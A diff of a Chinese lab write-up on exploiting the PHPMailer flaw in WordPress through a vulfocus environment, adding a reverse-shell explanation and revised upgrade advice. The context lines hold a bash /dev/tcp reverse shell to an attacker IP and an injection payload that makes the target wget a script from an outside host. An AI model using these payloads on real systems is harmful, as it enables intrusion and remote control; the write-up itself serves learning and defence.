@@ -33,7 +33,7 @@
 
 接下来在攻击机构建一个cmd.sh的脚本，攻击机ip为192.168.37.5，脚本内容为
 `bash -i >& /dev/tcp/192.168.37.5/9999 0>&1`
-端口号为9999
+通过 TCP 连接将目标主机的 shell（命令行界面）反向连接到攻击机的指定 IP 地址和端口。端口号为9999
 payload:
 `aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce 192.168.157.137/cmd.sh}} null)`
 执行反弹shell
@@ -71,9 +71,10 @@ payload2![1747589731849](image/exp2/1747589731849.png)
 部署 Web 应用程序防火墙 (WAF)：部署 Web 应用程序防火墙 (WAF) 来监视和过滤传入流量，以发现指示 RCE 攻击的可疑活动。 WAF 可以在恶意请求到达您的 WordPress 站点之前检测并阻止它们，从而提供针对网络威胁的额外防御层。
 应用最小权限原则让 PHP 进程运行在无 sudo、无编译器、无 /usr/bin/wget 等高危二进制的受限账户下；即便注入成功，也难以进一步横向或持久化。
 ### 修复
-将WordPress  升级到 ≥ 4.7.1（已内置 PHPMailer 5.2.21）或任何更高版本 WP 4.7.1 官方安全维护版已回溯修补此缺陷 
+将WordPress  升级到 ≥ 4.7.1（已内置 PHPMailer 5.2.21）WP 4.7.1 官方安全维护版已回溯修补此缺陷 或单独升级phpmailer版本
+![alt text](image/exp2/image.png)
 
-代码层 避免 将任何未验证输入写入 Sender或from
+代码层面 避免 将任何未验证输入写入 Sender或from
 ## 遇到的问题
 #### 1.登录vulfocus时显示服务器内部错误，查询相关资料后发现是redis服务启动出现了问题
 ![1747589893173](image/exp2/1747589893173.png)
